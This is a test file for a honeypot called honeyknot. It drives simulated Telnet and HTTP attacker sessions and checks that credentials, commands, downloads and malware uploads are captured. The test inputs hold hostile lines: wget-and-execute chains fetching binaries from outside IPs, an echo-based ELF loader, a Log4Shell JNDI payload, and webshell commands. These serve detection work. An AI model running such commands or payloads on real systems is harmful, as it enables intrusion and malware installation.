"""Handler-level integration for the shell, deception, and artifact paths.

These drive the real `TelnetHandler` / `HTTPHandler` through their public
lifecycle so the wiring between handler, `ShellSession`, `DeceptionSite`,
and `ctx.artifact` is covered, not just the pieces.
"""

from __future__ import annotations

import asyncio
import logging
import re

import pytest

from honeyknot.config import ResponseHeaders, Rule, ServiceConfig
from honeyknot.protocols import ConnectionContext, HTTPHandler, TelnetHandler


class _FakeWriter:
    def __init__(self):
        self.buffer = bytearray()
        self._closing = False

    def is_closing(self):
        return self._closing

    def write(self, data: bytes):
        self.buffer.extend(data)

    async def drain(self):
        return None

    def close(self):
        self._closing = True

    async def wait_closed(self):
        return None


def _ctx():
    writer = _FakeWriter()
    events: list[tuple[str, dict]] = []
    artifacts: list[dict] = []

    def store(*, name, data, kind):
        artifacts.append({"name": name, "data": data, "kind": kind})
        return "sha-" + str(len(artifacts))

    ctx = ConnectionContext(
        writer=writer, addr=("203.0.113.9", 51000), port=0,
        request_logger=logging.getLogger("test.req"), raw_capture=None,
        emit_event=lambda n, **f: events.append((n, f)),
        store_artifact=store,
    )
    return ctx, writer, events, artifacts


def _run(coro):
    return asyncio.run(coro)


def _cfg(protocol: str, **opts) -> ServiceConfig:
    return ServiceConfig(port=0, service_type="tcp", protocol=protocol,
                         protocol_opts=opts)


def _names(events, name):
    return [f for n, f in events if n == name]


class TestContextSend:
    def test_peer_hangup_marks_the_context_closed_instead_of_raising(self):
        # Scanners disconnect the moment they have what they came for; if
        # that propagated, every abandoned session would log a traceback.
        ctx, writer, _, _ = _ctx()

        async def boom():
            raise ConnectionResetError("Connection lost")

        writer.drain = boom
        _run(ctx.send(b"hello"))
        assert ctx.closed is True

    def test_send_is_a_noop_once_closed(self):
        ctx, writer, _, _ = _ctx()
        ctx.close()
        _run(ctx.send(b"hello"))
        assert writer.buffer == b""


class TestContextArtifact:
    def test_artifact_returns_the_digest(self):
        ctx, _, _, artifacts = _ctx()
        assert ctx.artifact("x.bin", b"data", kind="test") == "sha-1"
        assert artifacts[0]["kind"] == "test"

    def test_artifact_is_a_noop_without_a_store(self):
        ctx, _, _, _ = _ctx()
        ctx.store_artifact = None
        assert ctx.artifact("x", b"data") is None

    def test_empty_artifact_is_dropped(self):
        ctx, _, _, artifacts = _ctx()
        assert ctx.artifact("x", b"") is None
        assert artifacts == []


class TestTelnetShellSession:
    def test_full_mirai_style_session(self):
        ctx, writer, events, artifacts = _ctx()
        handler = TelnetHandler(_cfg("telnet", hostname="dvr", arch="mips"))
        _run(handler.on_connect(ctx))
        assert b"dvr login: " in writer.buffer

        _run(handler.on_data(b"root\r\n", ctx))
        _run(handler.on_data(b"xc3511\r\n", ctx))
        creds = _names(events, "credentials")[0]
        assert (creds["username"], creds["password"]) == ("root", "xc3511")
        assert b"BusyBox v1." in writer.buffer
        assert writer.buffer.endswith(b"root@dvr:/# ")

        writer.buffer.clear()
        _run(handler.on_data(b"/bin/busybox MIRAI\r\n", ctx))
        assert b"MIRAI: applet not found" in writer.buffer
        assert _names(events, "busybox_probe")[0]["applet"] == "MIRAI"

        writer.buffer.clear()
        _run(handler.on_data(b"cat /proc/mounts\r\n", ctx))
        assert b"tmpfs /tmp tmpfs rw" in writer.buffer

        writer.buffer.clear()
        _run(handler.on_data(b"cat /bin/echo\r\n", ctx))
        assert writer.buffer.startswith(b"\x7fELF\x01\x02")  # 32-bit, big endian

        _run(handler.on_data(b"cd /tmp\r\n", ctx))
        _run(handler.on_data(
            b"wget http://185.10.2.3/bins/mips -O dvrHelper\r\n", ctx))
        download = _names(events, "download_attempt")[0]
        assert download["urls"] == ["http://185.10.2.3/bins/mips"]
        assert download["service"] == "telnet"

        _run(handler.on_data(
            rb"echo -ne '\x7f\x45\x4c\x46" + rb"\x01" * 60 + b"' > .s\r\n", ctx))
        assert artifacts, "the echo-loader payload should be stored"
        assert artifacts[0]["data"][:4] == b"\x7fELF"
        assert artifacts[0]["kind"] == "shell_upload"
        assert artifacts[0]["name"] == "/tmp/.s"

    def test_shell_command_events_are_emitted(self):
        ctx, _, events, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"admin\r\nadmin\r\n", ctx))
        _run(handler.on_data(b"uname -a\r\n", ctx))
        assert _names(events, "shell_command")[0]["command"] == "uname -a"

    def test_exploit_signature_on_a_command_line(self):
        ctx, _, events, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root\r\nroot\r\n", ctx))
        _run(handler.on_data(
            b"cd /tmp; wget http://1.2.3.4/x; chmod +x x; ./x\r\n", ctx))
        hits = _names(events, "exploit_attempt")
        assert hits and "cmdi-download-exec" in hits[0]["exploit_ids"]

    def test_reject_first_makes_the_login_fail_once(self):
        ctx, writer, events, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet", reject_first=1))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root\r\nwrong\r\n", ctx))
        assert b"Login incorrect" in writer.buffer
        _run(handler.on_data(b"root\r\nright\r\n", ctx))
        assert b"BusyBox" in writer.buffer
        assert len(_names(events, "credentials")) == 2

    def test_heredoc_drop(self):
        ctx, writer, _, artifacts = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root\r\nroot\r\n", ctx))
        writer.buffer.clear()
        _run(handler.on_data(b"cat > /tmp/a.sh << EOF\r\n", ctx))
        assert writer.buffer.endswith(b"> ")
        _run(handler.on_data(b"wget http://1.2.3.4/m.sh\r\n", ctx))
        _run(handler.on_data(b"EOF\r\n", ctx))
        assert artifacts[0]["name"] == "/tmp/a.sh"
        assert b"wget http://1.2.3.4/m.sh" in artifacts[0]["data"]

    def test_exit_closes_the_session(self):
        ctx, _, _, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root\r\nroot\r\n", ctx))
        _run(handler.on_data(b"exit\r\n", ctx))
        assert ctx.closed

    def test_sessions_do_not_share_shell_state(self):
        handler = TelnetHandler(_cfg("telnet"))
        ctx_a, _, _, _ = _ctx()
        ctx_b, _, _, _ = _ctx()
        for ctx in (ctx_a, ctx_b):
            _run(handler.on_connect(ctx))
            _run(handler.on_data(b"root\r\nroot\r\n", ctx))
        _run(handler.on_data(b"cd /tmp\r\n", ctx_a))
        assert ctx_a.state["shell"].cwd == "/tmp"
        assert ctx_b.state["shell"].cwd == "/"

    def test_bare_enter_at_the_prompt_reprompts(self):
        ctx, writer, _, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root\r\nroot\r\n", ctx))
        writer.buffer.clear()
        _run(handler.on_data(b"\r\n", ctx))
        assert writer.buffer.endswith(b"root@localhost:/# ")

    @pytest.mark.parametrize("eol", [b"\r\n", b"\n", b"\r", b"\r\x00"])
    def test_every_line_ending_yields_exactly_one_prompt(self, eol):
        # A doubled prompt after each command is a honeypot tell.
        ctx, writer, _, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root" + eol + b"pw" + eol, ctx))
        writer.buffer.clear()
        _run(handler.on_data(b"id" + eol, ctx))
        assert bytes(writer.buffer).count(b"root@localhost:/# ") == 1

    def test_crlf_split_across_two_reads_is_still_one_line(self):
        ctx, writer, _, _ = _ctx()
        handler = TelnetHandler(_cfg("telnet"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"root\r\nroot\r\n", ctx))
        writer.buffer.clear()
        _run(handler.on_data(b"id\r", ctx))
        _run(handler.on_data(b"\n", ctx))
        assert bytes(writer.buffer).count(b"root@localhost:/# ") == 1


def _http_cfg(**opts) -> ServiceConfig:
    return ServiceConfig(
        port=80, service_type="http", protocol="http",
        rules=[Rule(name="app", pattern=re.compile("^GET /app"),
                    response="<html>configured rule</html>")],
        response_headers=ResponseHeaders(status_line="HTTP/1.1 200 OK",
                                         headers=["Server: test"]),
        default_response="<html>default</html>",
        protocol_opts=opts,
    )


class TestHTTPDeception:
    def test_deception_route_wins_over_a_configured_rule(self):
        ctx, writer, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg(hostname="web-01"))
        _run(handler.on_data(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        assert b"DB_PASSWORD=" in writer.buffer
        assert _names(events, "secret_served")

    def test_configured_rule_still_serves_unmatched_paths(self):
        ctx, writer, _, _ = _ctx()
        handler = HTTPHandler(_http_cfg(hostname="web-01"))
        _run(handler.on_data(b"GET /app HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        assert b"configured rule" in writer.buffer

    def test_deception_can_be_disabled(self):
        ctx, writer, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg(deception=False))
        _run(handler.on_data(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        assert b"DB_PASSWORD=" not in writer.buffer
        assert _names(events, "secret_served") == []

    def test_response_is_well_formed_with_content_length(self):
        ctx, writer, _, _ = _ctx()
        handler = HTTPHandler(_http_cfg(hostname="web-01"))
        _run(handler.on_data(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        head, _, body = bytes(writer.buffer).partition(b"\r\n\r\n")
        assert head.startswith(b"HTTP/1.1 200 OK")
        length = int(
            [line for line in head.split(b"\r\n")
             if line.lower().startswith(b"content-length")][0].split(b":")[1])
        assert length == len(body)

    def test_head_request_omits_the_body(self):
        ctx, writer, _, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(b"HEAD /.env HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        head, sep, body = bytes(writer.buffer).partition(b"\r\n\r\n")
        assert b"Content-Length:" in head
        assert body == b""

    def test_webshell_command_runs_through_the_shell(self):
        ctx, writer, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg(shell_user="www-data"))
        _run(handler.on_data(b"GET /shell?cmd=id HTTP/1.1\r\nHost: x\r\n\r\n",
                             ctx))
        assert b"uid=1000(www-data)" in writer.buffer
        assert _names(events, "web_command")[0]["command"] == "id"

    def test_webshell_echo_loader_becomes_an_artifact(self):
        ctx, _, _, artifacts = _ctx()
        handler = HTTPHandler(_http_cfg())
        body = (b"cmd=echo+-ne+'" + rb"\x7f\x45\x4c\x46" + rb"\x01" * 60 +
                b"'+>+/tmp/x")
        request = (b"POST /up.php HTTP/1.1\r\nHost: x\r\n"
                   b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
                   + body)
        _run(handler.on_data(request, ctx))
        assert artifacts and artifacts[0]["data"][:4] == b"\x7fELF"
        assert artifacts[0]["kind"] == "web_exec"

    def test_exploit_attempt_is_emitted_per_request(self):
        ctx, _, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(
            b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://1.2.3.4/a}\r\n"
            b"Host: x\r\n\r\n", ctx))
        hits = _names(events, "exploit_attempt")
        assert hits and "CVE-2021-44228" in hits[0]["exploit_ids"]
        assert hits[0]["severity"] == "critical"

    def test_credentials_from_a_login_post(self):
        ctx, _, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        body = b"log=admin&pwd=letmein"
        _run(handler.on_data(
            b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body,
            ctx))
        creds = _names(events, "credentials")[0]
        assert (creds["username"], creds["password"]) == ("admin", "letmein")

    def test_keep_alive_allows_pipelined_requests(self):
        ctx, writer, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(
            b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n"
            b"GET /.git/config HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        assert len(_names(events, "http_request")) == 2
        assert b"DB_PASSWORD=" in writer.buffer
        assert b"[remote " in writer.buffer

    def test_connection_close_is_honored(self):
        ctx, _, _, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(
            b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", ctx))
        assert ctx.closed


class TestHTTPProxyAbuse:
    def test_connect_is_accepted_and_the_tunnel_captured(self):
        ctx, writer, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(
            b"CONNECT smtp.example.com:25 HTTP/1.1\r\nHost: x\r\n\r\n", ctx))
        assert b"200 Connection established" in writer.buffer
        request = _names(events, "proxy_request")[0]
        assert request["dest_host"] == "smtp.example.com"
        assert request["dest_port"] == 25

        _run(handler.on_data(b"EHLO evil\r\nMAIL FROM:<a@b.c>\r\n", ctx))
        payload = _names(events, "proxy_payload")[0]
        assert "EHLO evil" in payload["preview"]
        assert ctx.state["tunnel_bytes"] == 30

    def test_bytes_after_the_connect_in_the_same_read_are_tunneled(self):
        ctx, _, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(
            b"CONNECT 1.2.3.4:443 HTTP/1.1\r\n\r\n\x16\x03\x01\x00\xa5", ctx))
        assert _names(events, "proxy_payload")[0]["bytes"] == 5

    def test_connect_without_a_port(self):
        ctx, _, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(b"CONNECT weirdtarget HTTP/1.1\r\n\r\n", ctx))
        assert _names(events, "proxy_request")[0]["dest_port"] is None


class TestHTTPRobustness:
    @pytest.mark.parametrize("raw", [
        b"\x00\x01\x02\x03\r\n\r\n",
        b"GET\r\n\r\n",
        b"GET / HTTP/1.1\r\nContent-Length: abc\r\n\r\n",
        b"GET / HTTP/1.1\r\nContent-Length: -5\r\n\r\n",
        b"POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\nzz\r\n",
        b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
    ])
    def test_malformed_requests_never_raise(self, raw):
        ctx, _, _, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(raw, ctx))

    def test_split_request_is_buffered(self):
        ctx, writer, events, _ = _ctx()
        handler = HTTPHandler(_http_cfg())
        _run(handler.on_data(b"GET /.env HT", ctx))
        assert writer.buffer == b""
        _run(handler.on_data(b"TP/1.1\r\nHost: x\r\n\r\n", ctx))
        assert len(_names(events, "http_request")) == 1
